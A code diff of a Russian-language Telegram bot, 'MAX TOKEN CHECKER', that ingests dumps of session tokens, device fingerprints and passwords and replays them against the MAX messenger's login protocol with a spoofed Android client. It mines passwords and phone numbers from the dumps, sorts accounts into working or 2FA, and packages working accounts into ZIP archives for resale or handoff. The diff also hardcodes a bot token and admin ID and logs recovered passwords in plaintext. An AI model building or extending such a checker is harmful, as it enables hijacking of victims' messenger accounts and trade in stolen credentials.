@@ -21,18 +21,13 @@ from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.utils.keyboard import InlineKeyboardBuilder
 from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, FSInputFile
 
-# Настройка логирования
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    handlers=[
-        logging.FileHandler('checker_bot.log'),
-        logging.StreamHandler()
-    ]
+    handlers=[logging.FileHandler('checker_bot.log'), logging.StreamHandler()]
 )
 logger = logging.getLogger(__name__)
 
-# Конфигурация
 BOT_TOKEN = "8844806386:AAEBPiQqNjKfi-f41FsPWXwQpuAaM43y-Qw"
 ADMIN_ID = 8632861931
 ACCOUNTS_FILE = "checked_accounts.json"
@@ -86,7 +81,6 @@ def unpack(data: bytes) -> dict:
             unpacker = msgpack.Unpacker(raw=False, strict_map_key=False)
             unpacker.feed(data)
             result = next(unpacker)
-            # msgpack может вернуть данные в tuple
             if isinstance(result, tuple) and len(result) > 0:
                 return list(result)
             return result
@@ -179,29 +173,32 @@ class MaxConnection:
 
 class TokenParser:
     @staticmethod
-    def extract_token(text: str) -> str:
-        match = re.search(r'(An_[A-Za-z0-9\-_=+]{100,})', text)
-        if match:
-            return match.group(1)
+    def find_password(text: str) -> str:
+        """Ищет пароль ВЕЗДЕ - в JSON, после JSON, в отдельных строках"""
         
-        match = re.search(r'(?:^|\s)([A-Za-z0-9\-_=+]{100,})(?:\s|$)', text)
-        if match:
-            token = match.group(1)
-            if not token.startswith('{') and not token.startswith('const'):
-                return token
-        return None
-    
-    @staticmethod
-    def extract_password(text: str) -> str:
+        # 1. Ищем пароль после } и перед const customPayload
+        # Формат: ...JSON... пароль\nconst customPayload = "...";
         match = re.search(r'\}\s+([A-Za-z0-9@#$%^&*!]+)\s*(?:const\s+customPayload|$)', text)
         if match:
-            return match.group(1)
+            pwd = match.group(1)
+            if 3 <= len(pwd) <= 50:
+                logger.info(f"Password found after JSON: {pwd}")
+                return pwd
         
-        for pattern in [r'"password"\s*:\s*"([^"]+)"', r'"pass"\s*:\s*"([^"]+)"']:
+        # 2. Ищем в JSON полях password/pass/pwd
+        for pattern in [
+            r'"[Pp][Aa][Ss][Ss][Ww][Oo][Rr][Dd]"\s*:\s*"([^"]+)"',
+            r'"[Pp][Aa][Ss][Ss]"\s*:\s*"([^"]+)"',
+            r'"[Pp][Ww][Dd]"\s*:\s*"([^"]+)"',
+        ]:
             match = re.search(pattern, text)
             if match:
-                return match.group(1)
+                pwd = match.group(1)
+                if 3 <= len(pwd) <= 50:
+                    logger.info(f"Password found in JSON field: {pwd}")
+                    return pwd
         
+        # 3. Ищем строку со спецсимволами (!@#$%^&*) - это почти всегда пароль
         lines = text.strip().split('\n')
         for line in lines:
             line = line.strip()
@@ -210,14 +207,93 @@ class TokenParser:
             if line.startswith('{') or line.startswith('const') or line.startswith('An_'):
                 continue
             if re.search(r'[!@#$%^&*]', line):
+                logger.info(f"Password found by special chars: {line}")
                 return line
+        
+        # 4. Ищем строку которая выглядит как пароль (буквы + цифры, не телефон)
+        for line in lines:
+            line = line.strip()
+            if len(line) < 4 or len(line) > 50:
+                continue
+            if line.startswith('{') or line.startswith('const') or line.startswith('An_'):
+                continue
+            if line.startswith('+') or line.isdigit():
+                continue
+            if re.search(r'[A-Za-z]', line) and re.search(r'[0-9]', line):
+                logger.info(f"Password found by pattern: {line}")
+                return line
+        
+        # 5. Ищем пароль в самом токене (base64 части)
+        token_match = re.search(r'(An_[A-Za-z0-9\-_=+]{100,})', text)
+        if token_match:
+            token = token_match.group(1)
+            parts = re.split(r'[\._\-]', token)
+            for part in parts:
+                if len(part) < 8 or len(part) > 200:
+                    continue
+                for padding in ['', '=', '==', '===']:
+                    try:
+                        decoded = base64.b64decode(part + padding).decode('utf-8', errors='ignore')
+                        if 4 <= len(decoded) <= 30 and re.search(r'[!@#$%^&*]', decoded):
+                            logger.info(f"Password found in token base64: {decoded}")
+                            return decoded
+                    except:
+                        continue
         
         return ""
     
     @staticmethod
+    def extract_token(text: str) -> str:
+        match = re.search(r'"token"\s*:\s*"([^"]+)"', text)
+        if match:
+            return match.group(1)
+        match = re.search(r'(An_[A-Za-z0-9\-_=+]{100,})', text)
+        if match:
+            return match.group(1)
+        match = re.search(r'(?:^|\s)([A-Za-z0-9\-_=+]{100,})(?:\s|$)', text)
+        if match:
+            token = match.group(1)
+            if not token.startswith('{') and not token.startswith('const'):
+                return token
+        return None
+    
+    @staticmethod
+    def extract_phone_from_json(data: dict) -> str:
+        for field in ["phone", "phoneNumber"]:
+            val = data.get(field, "")
+            if val:
+                return str(val)
+        token_profile = data.get("token_profile", {})
+        if isinstance(token_profile, dict):
+            phone = token_profile.get("phone", "")
+            if phone:
+                return str(phone)
+        user = data.get("user", {})
+        if isinstance(user, dict):
+            phone = user.get("phone", "")
+            if phone:
+                return str(phone)
+        return ""
+    
+    @staticmethod
+    def extract_device_info_from_json(data: dict) -> dict:
+        device_profile = data.get("device_profile", {})
+        if device_profile:
+            return device_profile
+        user_agent = data.get("userAgent", {})
+        if user_agent:
+            return user_agent
+        device_info = data.get("deviceInfo", {})
+        if device_info:
+            return device_info
+        device = data.get("device", {})
+        if device:
+            return device
+        return {}
+    
+    @staticmethod
     def extract_device_info(text: str) -> dict:
         device_info = {}
-        
         json_match = re.search(r'\{[^{}]*"deviceType"[^{}]*\}', text)
         if json_match:
             try:
@@ -228,7 +304,6 @@ class TokenParser:
                     device_info.update(data)
             except:
                 pass
-        
         if not device_info:
             fields = {
                 "deviceId": r'"deviceId"\s*:\s*"([^"]+)"',
@@ -241,7 +316,6 @@ class TokenParser:
                 "screen": r'"screen"\s*:\s*"([^"]+)"',
                 "timezone": r'"timezone"\s*:\s*"([^"]+)"',
             }
-            
             for field, pattern in fields.items():
                 match = re.search(pattern, text)
                 if match:
@@ -249,7 +323,6 @@ class TokenParser:
                         device_info[field] = int(match.group(1))
                     else:
                         device_info[field] = match.group(1)
-        
         return device_info
     
     @staticmethod
@@ -260,41 +333,72 @@ class TokenParser:
         match = re.search(r'"customPayload"\s*:\s*"(\d+)"', text)
         if match:
             return match.group(1)
+        match = re.search(r'"customPayload"\s*:\s*(\d+)', text)
+        if match:
+            return match.group(1)
         return None
     
     @staticmethod
     def parse_content(content: str) -> list:
         results = []
         
+        # Пробуем JSON
         try:
             data = json.loads(content)
             if isinstance(data, list):
                 for item in data:
                     if isinstance(item, dict):
-                        token = item.get("token") or item.get("accessToken") or ""
-                        if token and len(token) > 50:
-                            results.append({
-                                "token": token,
-                                "device_info": item.get("deviceInfo") or item.get("userAgent") or {},
-                                "password": item.get("password") or "",
-                                "custom_payload": str(item.get("customPayload", "")) if item.get("customPayload") else None
-                            })
-            elif isinstance(data, dict):
-                token = data.get("token") or data.get("accessToken") or ""
-                if token and len(token) > 50:
-                    results.append({
-                        "token": token,
-                        "device_info": data.get("deviceInfo") or data.get("userAgent") or {},
-                        "password": data.get("password") or "",
-                        "custom_payload": str(data.get("customPayload", "")) if data.get("customPayload") else None
-                    })
-            if results:
+                        parsed = TokenParser.parse_single_account(item)
+                        if parsed:
+                            results.append(parsed)
                 return results
+            if isinstance(data, dict):
+                if "token" in data:
+                    parsed = TokenParser.parse_single_account(data)
+                    if parsed:
+                        results.append(parsed)
+                        return results
+                for key in ["tokens", "accounts", "data", "sessions", "results"]:
+                    if key in data and isinstance(data[key], list):
+                        for item in data[key]:
+                            if isinstance(item, dict):
+                                parsed = TokenParser.parse_single_account(item)
+                                if parsed:
+                                    results.append(parsed)
+                        if results:
+                            return results
+                for key, value in data.items():
+                    if isinstance(value, list):
+                        for item in value:
+                            if isinstance(item, dict) and "token" in item:
+                                parsed = TokenParser.parse_single_account(item)
+                                if parsed:
+                                    results.append(parsed)
+                        if results:
+                            return results
         except:
             pass
         
-        blocks = re.split(r'\n\s*\n', content)
+        # Построчный JSON
+        lines = content.strip().split('\n')
+        for line in lines:
+            line = line.strip()
+            if not line:
+                continue
+            try:
+                data = json.loads(line)
+                if isinstance(data, dict) and "token" in data:
+                    parsed = TokenParser.parse_single_account(data)
+                    if parsed:
+                        results.append(parsed)
+            except:
+                pass
         
+        if results:
+            return results
+        
+        # Текстовые блоки
+        blocks = re.split(r'\n\s*\n', content)
         for block in blocks:
             block = block.strip()
             if not block:
@@ -304,7 +408,7 @@ class TokenParser:
             if not token:
                 continue
             
-            password = TokenParser.extract_password(block)
+            password = TokenParser.find_password(block)
             device_info = TokenParser.extract_device_info(block)
             custom_payload = TokenParser.extract_custom_payload(block)
             
@@ -315,10 +419,42 @@ class TokenParser:
                 "token": token,
                 "device_info": device_info,
                 "password": password,
+                "phone": "",
                 "custom_payload": custom_payload
             })
         
         return results
+    
+    @staticmethod
+    def parse_single_account(data: dict) -> dict:
+        token = data.get("token", "")
+        if not token or len(token) < 50:
+            return None
+        
+        phone = TokenParser.extract_phone_from_json(data)
+        device_info = TokenParser.extract_device_info_from_json(data)
+        
+        if "deviceId" not in device_info:
+            device_id = data.get("device_id", str(uuid.uuid4()))
+            device_info["deviceId"] = device_id
+        
+        # Ищем пароль во всем JSON
+        json_str = json.dumps(data)
+        password = TokenParser.find_password(json_str)
+        
+        custom_payload = data.get("customPayload") or data.get("custom_payload")
+        if custom_payload:
+            custom_payload = str(custom_payload)
+        
+        logger.info(f"Parsed: phone={phone}, password={password}, device_info={list(device_info.keys())}")
+        
+        return {
+            "token": token,
+            "device_info": device_info,
+            "password": password,
+            "phone": phone,
+            "custom_payload": custom_payload
+        }
 
 # ==================== ДАННЫЕ ====================
 
@@ -346,29 +482,20 @@ def is_duplicate_token(token: str) -> bool:
             return True
     return False
 
-# ==================== ИЗВЛЕЧЕНИЕ ТЕЛЕФОНА ====================
-
 def deep_find_phone(data, depth=0):
-    """Рекурсивно ищет телефон в любом уровне вложенности"""
     if depth > 10:
         return ""
-    
     if isinstance(data, dict):
-        # Ищем в user объекте
         if "user" in data:
             user = data["user"]
             if isinstance(user, dict):
                 phone = user.get("phone", "")
                 if phone and isinstance(phone, str) and len(phone) >= 10:
                     return str(phone)
-        
-        # Ищем телефон в ключах
-        for key in ["phone", "phoneNumber", "login", "username"]:
+        for key in ["phone", "phoneNumber", "login"]:
             val = data.get(key, "")
             if isinstance(val, str) and len(val) >= 10 and any(c.isdigit() for c in val):
                 return str(val)
-        
-        # Ищем строку похожую на телефон
         for key, value in data.items():
             if isinstance(value, str) and len(value) >= 10:
                 cleaned = re.sub(r'[\s\(\)\-]', '', value)
@@ -378,39 +505,28 @@ def deep_find_phone(data, depth=0):
                 result = deep_find_phone(value, depth + 1)
                 if result:
                     return result
-    
     elif isinstance(data, list):
         for item in data:
             result = deep_find_phone(item, depth + 1)
             if result:
                 return result
-    
     return ""
 
-# ==================== ВАЛИДАЦИЯ ТОКЕНА ====================
+# ==================== ВАЛИДАЦИЯ ====================
 
 async def validate_token(token: str, device_id: str, device_info: dict = None) -> dict:
     conn = MaxConnection()
-    
     try:
         if not conn.connect():
             return {"valid": False, "error": "Connection failed"}
         
         now_ms = int(time.time() * 1000)
         user_agent = {
-            "deviceType": "ANDROID",
-            "appVersion": "26.17.1",
-            "osVersion": "Android 10",
-            "timezone": "Europe/Moscow",
-            "screen": "408dpi 1080x2292",
-            "pushDeviceType": "GCM",
-            "arch": "arm64-v8a",
-            "locale": "ru",
-            "buildNumber": 6712,
-            "deviceName": "Google Pixel 7",
-            "deviceLocale": "ru"
+            "deviceType": "ANDROID", "appVersion": "26.17.1", "osVersion": "Android 10",
+            "timezone": "Europe/Moscow", "screen": "408dpi 1080x2292", "pushDeviceType": "GCM",
+            "arch": "arm64-v8a", "locale": "ru", "buildNumber": 6712,
+            "deviceName": "Google Pixel 7", "deviceLocale": "ru"
         }
-        
         if device_info:
             user_agent.update(device_info)
         
@@ -420,40 +536,27 @@ async def validate_token(token: str, device_id: str, device_info: dict = None) -
             "userAgent": user_agent,
             "deviceId": device_id
         }
-        
         conn.send(Packet(Opcode.SESSION_INIT, pack(payload)))
         await asyncio.sleep(0.5)
         
-        login_payload = {
-            "token": token,
-            "deviceId": device_id,
-            "userAgent": user_agent
-        }
-        
+        login_payload = {"token": token, "deviceId": device_id, "userAgent": user_agent}
         resp = conn.send(Packet(Opcode.LOGIN, pack(login_payload)))
         
         if not resp or not resp.payload:
             return {"valid": False, "error": "Empty response"}
         
         data = unpack(resp.payload)
+        logger.info(f"Response: {str(data)[:500]}")
         
-        # Логируем для отладки
-        logger.info(f"Response type: {type(data)}")
-        if isinstance(data, (dict, list)):
-            logger.info(f"Response keys: {list(data.keys()) if isinstance(data, dict) else f'list len={len(data)}'}")
-        logger.info(f"Response: {str(data)[:1000]}")
-        
-        # Извлекаем телефон рекурсивно
         phone = deep_find_phone(data)
-        logger.info(f"Found phone: {phone}")
+        logger.info(f"Phone: {phone}")
         
-        # Проверяем статус
         is_valid = True
         has_2fa = False
         error = None
         
         if isinstance(data, (int, float)):
-            return {"valid": True, "phone": phone, "user_id": int(data)}
+            return {"valid": True, "phone": phone}
         
         if isinstance(data, list) and len(data) > 0:
             first = data[0]
@@ -467,7 +570,6 @@ async def validate_token(token: str, device_id: str, device_info: dict = None) -
                     else:
                         is_valid = False
                         error = error_msg
-        
         elif isinstance(data, dict):
             if data.get("passwordChallenge"):
                 has_2fa = True
@@ -485,9 +587,7 @@ async def validate_token(token: str, device_id: str, device_info: dict = None) -
             return {"valid": True, "phone": phone}
         else:
             return {"valid": False, "error": error or "Unknown error"}
-        
     except Exception as e:
-        logger.error(f"Validation error: {e}")
         return {"valid": False, "error": str(e)}
     finally:
         conn.close()
@@ -511,28 +611,17 @@ async def start(message: types.Message):
     if message.from_user.id != ADMIN_ID:
         await message.answer("❌ Доступ запрещен")
         return
-    
     valid = sum(1 for a in accounts.values() if a.get("status") == "valid")
     twofa = sum(1 for a in accounts.values() if a.get("status") == "2fa")
-    
     await message.answer(
-        f"🤖 <b>MAX TOKEN CHECKER</b>\n\n"
-        f"📥 Загрузите файл с токенами (.txt, .json, .zip)\n"
-        f"🔍 Бот проверит все токены\n"
-        f"💾 Выгрузите рабочие токены в ZIP\n"
-        f"📄 Каждый токен в отдельном файле\n\n"
-        f"📊 <b>В базе:</b> {len(accounts)} токенов\n"
-        f"✅ Рабочих: {valid}\n"
-        f"🔐 2FA: {twofa}",
-        parse_mode="HTML",
-        reply_markup=main_keyboard()
+        f"🤖 <b>MAX TOKEN CHECKER</b>\n\n📥 Загрузите файл с токенами (.txt, .json, .zip)\n🔍 Бот проверит все токены\n💾 Выгрузите рабочие токены в ZIP\n📄 Каждый токен в отдельном файле\n\n📊 <b>В базе:</b> {len(accounts)}\n✅ Рабочих: {valid}\n🔐 2FA: {twofa}",
+        parse_mode="HTML", reply_markup=main_keyboard()
     )
 
 @dp.callback_query(F.data == "upload")
 async def cb_upload(callback: types.CallbackQuery, state: FSMContext):
     if callback.from_user.id != ADMIN_ID:
         return await callback.answer("❌ Доступ запрещен", show_alert=True)
-    
     await state.set_state(AuthState.waiting_for_file)
     await callback.message.answer("📥 Отправьте файл с токенами (.txt, .json, .zip)")
     await callback.answer()
@@ -541,24 +630,18 @@ async def cb_upload(callback: types.CallbackQuery, state: FSMContext):
 async def handle_file(message: types.Message, state: FSMContext):
     if message.from_user.id != ADMIN_ID:
         return
-    
     doc = message.document
     file_name = doc.file_name.lower()
-    
     if not file_name.endswith(('.txt', '.json', '.zip')):
         await message.answer("❌ Отправьте файл .txt, .json или .zip")
         return
-    
     msg = await message.answer("⏳ Обрабатываю файл...")
     await state.clear()
-    
     try:
         file = await bot.get_file(doc.file_id)
         file_bytes = await bot.download_file(file.file_path)
         raw_bytes = file_bytes.read()
-        
         all_tokens = []
-        
         if file_name.endswith('.zip'):
             try:
                 zip_buffer = BytesIO(raw_bytes)
@@ -576,7 +659,6 @@ async def handle_file(message: types.Message, state: FSMContext):
                                     continue
                             else:
                                 continue
-                            
                             tokens = TokenParser.parse_content(content)
                             all_tokens.extend(tokens)
                         except:
@@ -594,40 +676,30 @@ async def handle_file(message: types.Message, state: FSMContext):
             else:
                 await msg.edit_text("❌ Не удалось прочитать файл")
                 return
-            
             all_tokens = TokenParser.parse_content(content)
-        
         if not all_tokens:
             await msg.edit_text("❌ Токены не найдены в файле")
             return
-        
         await msg.edit_text(f"🔍 Проверяю <b>{len(all_tokens)}</b> токенов...", parse_mode="HTML")
-        
         valid_count = 0
         invalid_count = 0
         twofa_count = 0
         duplicate_count = 0
         results = []
-        
         total = len(all_tokens)
         checked = 0
-        
         for token_data in all_tokens:
             checked += 1
             token = token_data["token"]
             password = token_data.get("password", "")
             device_info = token_data.get("device_info", {})
             custom_payload = token_data.get("custom_payload")
-            
             if is_duplicate_token(token):
                 duplicate_count += 1
                 results.append("· ↻ дубликат")
                 continue
-            
             device_id = device_info.get("deviceId", str(uuid.uuid4()))
             result = await validate_token(token, device_id, device_info)
-            
-            # Извлекаем телефон
             phone = result.get("phone", "")
             if phone:
                 phone = re.sub(r'[\s\(\)\-]', '', phone)
@@ -635,11 +707,6 @@ async def handle_file(message: types.Message, state: FSMContext):
                     phone = phone[1:]
                 if phone.isdigit() and len(phone) == 10:
                     phone = '7' + phone
-                elif phone.isdigit() and len(phone) == 11:
-                    pass  # уже норм
-                else:
-                    phone = phone  # оставляем как есть
-            
             if result["valid"]:
                 if result.get("has_2fa"):
                     twofa_count += 1
@@ -649,51 +716,28 @@ async def handle_file(message: types.Message, state: FSMContext):
                     valid_count += 1
                     status = "valid"
                     results.append(f"· {phone or '?'} ✓ | пароль: {password}" if password else f"· {phone or '?'} ✓")
-                
-                # Сохраняем в базу ТОЛЬКО рабочие
                 acc_id = str(uuid.uuid4())[:8]
                 accounts[acc_id] = {
-                    "token": token,
-                    "device_id": device_id,
-                    "phone": phone or "",
-                    "password": password,
-                    "device_info": device_info,
-                    "custom_payload": custom_payload,
-                    "status": status,
-                    "checked_at": time.time()
+                    "token": token, "device_id": device_id, "phone": phone or "",
+                    "password": password, "device_info": device_info,
+                    "custom_payload": custom_payload, "status": status, "checked_at": time.time()
                 }
             else:
                 invalid_count += 1
                 error = result.get("error", "неизвестно")
                 results.append(f"· {phone or '?'} ✗ {error[:80]}")
-            
             if checked % 10 == 0 or checked == total:
                 try:
                     await msg.edit_text(
-                        f"🔍 Проверка: <b>{checked}/{total}</b>\n"
-                        f"✅ Рабочих: <b>{valid_count}</b>\n"
-                        f"🔐 2FA: <b>{twofa_count}</b>\n"
-                        f"❌ Битых: <b>{invalid_count}</b>\n"
-                        f"🔄 Дублей: <b>{duplicate_count}</b>",
+                        f"🔍 Проверка: <b>{checked}/{total}</b>\n✅ Рабочих: <b>{valid_count}</b>\n🔐 2FA: <b>{twofa_count}</b>\n❌ Битых: <b>{invalid_count}</b>\n🔄 Дублей: <b>{duplicate_count}</b>",
                         parse_mode="HTML"
                     )
                 except:
                     pass
-        
         save_data()
-        
-        report = f"👍 <b>Проверка завершена!</b>\n\n"
-        report += f"📦 Проверено: <b>{total}</b>\n"
-        report += f"✅ Рабочих: <b>{valid_count}</b>\n"
-        report += f"🔐 2FA: <b>{twofa_count}</b>\n"
-        report += f"❌ Битых: <b>{invalid_count}</b>\n"
-        report += f"🔄 Дублей: <b>{duplicate_count}</b>\n"
-        report += f"📊 В базе: <b>{len(accounts)}</b>\n\n"
-        report += "\n".join(results[:30])
-        
+        report = f"👍 <b>Проверка завершена!</b>\n\n📦 Проверено: <b>{total}</b>\n✅ Рабочих: <b>{valid_count}</b>\n🔐 2FA: <b>{twofa_count}</b>\n❌ Битых: <b>{invalid_count}</b>\n🔄 Дублей: <b>{duplicate_count}</b>\n📊 В базе: <b>{len(accounts)}</b>\n\n" + "\n".join(results[:30])
         if len(results) > 30:
             report += f"\n\n...и ещё {len(results) - 30}"
-        
         if len(report) > 4000:
             parts = []
             current = ""
@@ -705,13 +749,11 @@ async def handle_file(message: types.Message, state: FSMContext):
                     current += line + '\n'
             if current:
                 parts.append(current)
-            
             await msg.edit_text(parts[0], parse_mode="HTML")
             for part in parts[1:]:
                 await message.answer(part, parse_mode="HTML")
         else:
             await msg.edit_text(report, parse_mode="HTML")
-        
     except Exception as e:
         logger.error(f"Error: {e}")
         await msg.edit_text(f"❌ Ошибка: {str(e)[:500]}")
@@ -720,21 +762,11 @@ async def handle_file(message: types.Message, state: FSMContext):
 async def cb_stats(callback: types.CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
         return await callback.answer("❌ Доступ запрещен", show_alert=True)
-    
     valid = sum(1 for a in accounts.values() if a.get("status") == "valid")
     twofa = sum(1 for a in accounts.values() if a.get("status") == "2fa")
     with_pass = sum(1 for a in accounts.values() if a.get("password"))
     with_phone = sum(1 for a in accounts.values() if a.get("phone"))
-    
-    text = (
-        f"📊 <b>СТАТИСТИКА</b>\n\n"
-        f"📦 Всего в базе: <b>{len(accounts)}</b>\n"
-        f"✅ Рабочих: <b>{valid}</b>\n"
-        f"🔐 2FA: <b>{twofa}</b>\n"
-        f"🔑 С паролями: <b>{with_pass}</b>\n"
-        f"📱 С телефонами: <b>{with_phone}</b>\n"
-    )
-    
+    text = f"📊 <b>СТАТИСТИКА</b>\n\n📦 Всего: <b>{len(accounts)}</b>\n✅ Рабочих: <b>{valid}</b>\n🔐 2FA: <b>{twofa}</b>\n🔑 С паролями: <b>{with_pass}</b>\n📱 С телефонами: <b>{with_phone}</b>"
     await callback.message.answer(text, parse_mode="HTML", reply_markup=main_keyboard())
     await callback.answer()
 
@@ -742,77 +774,50 @@ async def cb_stats(callback: types.CallbackQuery):
 async def cb_export_valid(callback: types.CallbackQuery, state: FSMContext):
     if callback.from_user.id != ADMIN_ID:
         return await callback.answer("❌ Доступ запрещен", show_alert=True)
-    
     valid_accounts = {k: v for k, v in accounts.items() if v.get("status") == "valid"}
-    
     if not valid_accounts:
         await callback.answer("Нет рабочих токенов", show_alert=True)
         return
-    
     await state.set_state(AuthState.waiting_export_count)
     await state.update_data(export_type="valid", export_accounts=valid_accounts)
-    
-    await callback.message.answer(
-        f"📦 Рабочих токенов: <b>{len(valid_accounts)}</b>\n\n"
-        f"Введите количество для выгрузки (или <code>all</code> для всех):",
-        parse_mode="HTML"
-    )
+    await callback.message.answer(f"📦 Рабочих: <b>{len(valid_accounts)}</b>\n\nВведите количество (или <code>all</code>):", parse_mode="HTML")
     await callback.answer()
 
 @dp.callback_query(F.data == "export_2fa")
 async def cb_export_2fa(callback: types.CallbackQuery, state: FSMContext):
     if callback.from_user.id != ADMIN_ID:
         return await callback.answer("❌ Доступ запрещен", show_alert=True)
-    
     twofa_accounts = {k: v for k, v in accounts.items() if v.get("status") == "2fa"}
-    
     if not twofa_accounts:
-        await callback.answer("Нет токенов с 2FA", show_alert=True)
+        await callback.answer("Нет 2FA токенов", show_alert=True)
         return
-    
     await state.set_state(AuthState.waiting_export_count)
     await state.update_data(export_type="2fa", export_accounts=twofa_accounts)
-    
-    await callback.message.answer(
-        f"📦 Токенов 2FA: <b>{len(twofa_accounts)}</b>\n\n"
-        f"Введите количество для выгрузки (или <code>all</code> для всех):",
-        parse_mode="HTML"
-    )
+    await callback.message.answer(f"📦 2FA: <b>{len(twofa_accounts)}</b>\n\nВведите количество (или <code>all</code>):", parse_mode="HTML")
     await callback.answer()
 
 @dp.callback_query(F.data == "export_all")
 async def cb_export_all(callback: types.CallbackQuery, state: FSMContext):
     if callback.from_user.id != ADMIN_ID:
         return await callback.answer("❌ Доступ запрещен", show_alert=True)
-    
     if not accounts:
         await callback.answer("База пуста", show_alert=True)
         return
-    
     await state.set_state(AuthState.waiting_export_count)
     await state.update_data(export_type="all", export_accounts=accounts.copy())
-    
-    await callback.message.answer(
-        f"📦 Всего токенов: <b>{len(accounts)}</b>\n\n"
-        f"Введите количество для выгрузки (или <code>all</code> для всех):",
-        parse_mode="HTML"
-    )
+    await callback.message.answer(f"📦 Всего: <b>{len(accounts)}</b>\n\nВведите количество (или <code>all</code>):", parse_mode="HTML")
     await callback.answer()
 
 @dp.message(AuthState.waiting_export_count)
 async def handle_export_count(message: types.Message, state: FSMContext):
     if message.from_user.id != ADMIN_ID:
         return
-    
     data = await state.get_data()
     export_type = data.get("export_type")
     all_accounts = data.get("export_accounts", {})
-    
     total = len(all_accounts)
-    
     try:
         count_str = message.text.strip().lower()
-        
         if count_str == "all":
             count = total
         else:
@@ -825,26 +830,19 @@ async def handle_export_count(message: types.Message, state: FSMContext):
     except:
         await message.answer("❌ Введите число или <code>all</code>", parse_mode="HTML")
         return
-    
     await state.clear()
-    
-    # Берем нужное количество
     selected = dict(list(all_accounts.items())[:count])
-    
     await export_tokens(message, selected, f"{export_type}_{count}")
 
 async def export_tokens(message_or_callback, accs: dict, prefix: str):
-    """Экспортирует токены в ZIP и удаляет из базы"""
     if isinstance(message_or_callback, types.Message):
         msg = await message_or_callback.answer("⏳ Создаю архив...")
         chat = message_or_callback.chat
     else:
         msg = await message_or_callback.message.answer("⏳ Создаю архив...")
         chat = message_or_callback.message.chat
-    
     try:
         zip_buffer = BytesIO()
-        
         with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
             for acc_id, acc in accs.items():
                 token = acc.get("token", "")
@@ -854,65 +852,38 @@ async def export_tokens(message_or_callback, accs: dict, prefix: str):
                 device_info = acc.get("device_info", {})
                 custom_payload = acc.get("custom_payload", "")
                 device_id = acc.get("device_id", "")
-                
-                # Имя файла
                 if phone:
                     filename = f"{phone}"
                 else:
                     filename = f"{acc_id[:8]}"
-                
                 if password:
                     filename += f"_pass_{password}"
-                
                 if status == "2fa":
                     filename += "_2FA"
-                
-                # Содержимое файла
                 content = token + "\n"
-                
-                # Оригинальный device_info
-                if device_info:
-                    if "deviceId" not in device_info:
-                        device_info["deviceId"] = device_id
-                    content += json.dumps(device_info, ensure_ascii=False) + "\n"
-                
+                if device_info and isinstance(device_info, dict) and len(device_info) > 0:
+                    info = device_info.copy()
+                    if "deviceId" not in info:
+                        info["deviceId"] = device_id
+                    content += json.dumps(info, ensure_ascii=False) + "\n"
+                else:
+                    content += json.dumps({"deviceId": device_id}, ensure_ascii=False) + "\n"
                 if password:
                     content += password + "\n"
-                
                 if custom_payload:
                     content += f'const customPayload = "{custom_payload}";\n'
-                
                 zf.writestr(f"{filename}.txt", content)
-        
         zip_buffer.seek(0)
-        
-        # Временный файл
         temp_file = f"export_{prefix}_{int(time.time())}.zip"
         with open(temp_file, 'wb') as f:
             f.write(zip_buffer.read())
-        
-        # Отправляем
-        await bot.send_document(
-            chat.id,
-            FSInputFile(temp_file),
-            caption=f"💾 {prefix}\n📦 Токенов: {len(accs)}\n🗑 Удалены из базы"
-        )
-        
+        await bot.send_document(chat.id, FSInputFile(temp_file), caption=f"💾 {prefix}\n📦 Токенов: {len(accs)}\n🗑 Удалены из базы")
         os.remove(temp_file)
-        
-        # Удаляем из базы
         for acc_id in accs:
             if acc_id in accounts:
                 del accounts[acc_id]
         save_data()
-        
-        await msg.edit_text(
-            f"✅ Выгружено <b>{len(accs)}</b> токенов\n"
-            f"🗑 Удалены из базы\n"
-            f"📊 Осталось: <b>{len(accounts)}</b>",
-            parse_mode="HTML"
-        )
-        
+        await msg.edit_text(f"✅ Выгружено <b>{len(accs)}</b> токенов\n🗑 Удалены\n📊 Осталось: <b>{len(accounts)}</b>", parse_mode="HTML")
     except Exception as e:
         logger.error(f"Export error: {e}")
         await msg.edit_text(f"❌ Ошибка: {str(e)[:200]}")
@@ -921,32 +892,19 @@ async def export_tokens(message_or_callback, accs: dict, prefix: str):
 async def cb_clear_db(callback: types.CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
         return await callback.answer("❌ Доступ запрещен", show_alert=True)
-    
     builder = InlineKeyboardBuilder()
-    builder.row(
-        InlineKeyboardButton(text="✅ Да, очистить", callback_data="confirm_clear"),
-        InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_clear")
-    )
-    
-    await callback.message.answer(
-        f"🗑 <b>Очистить базу?</b>\n\n"
-        f"Будет удалено <b>{len(accounts)}</b> токенов.\n"
-        f"Это действие нельзя отменить!",
-        parse_mode="HTML",
-        reply_markup=builder.as_markup()
-    )
+    builder.row(InlineKeyboardButton(text="✅ Да, очистить", callback_data="confirm_clear"), InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_clear"))
+    await callback.message.answer(f"🗑 <b>Очистить базу?</b>\n\nБудет удалено <b>{len(accounts)}</b> токенов.", parse_mode="HTML", reply_markup=builder.as_markup())
     await callback.answer()
 
 @dp.callback_query(F.data == "confirm_clear")
 async def cb_confirm_clear(callback: types.CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
         return await callback.answer("❌ Доступ запрещен", show_alert=True)
-    
     global accounts
     count = len(accounts)
     accounts = {}
     save_data()
-    
     await callback.message.edit_text(f"✅ База очищена! Удалено <b>{count}</b> токенов.", parse_mode="HTML")
     await callback.answer()
 
@@ -959,25 +917,12 @@ async def cb_cancel_clear(callback: types.CallbackQuery):
 async def menu(message: types.Message):
     if message.from_user.id != ADMIN_ID:
         return
-    
     valid = sum(1 for a in accounts.values() if a.get("status") == "valid")
     twofa = sum(1 for a in accounts.values() if a.get("status") == "2fa")
-    
-    await message.answer(
-        f"🤖 <b>MAX TOKEN CHECKER</b>\n\n"
-        f"📊 В базе: <b>{len(accounts)}</b> токенов\n"
-        f"✅ Рабочих: {valid}\n"
-        f"🔐 2FA: {twofa}",
-        parse_mode="HTML",
-        reply_markup=main_keyboard()
-    )
-
-# ==================== ЗАПУСК ====================
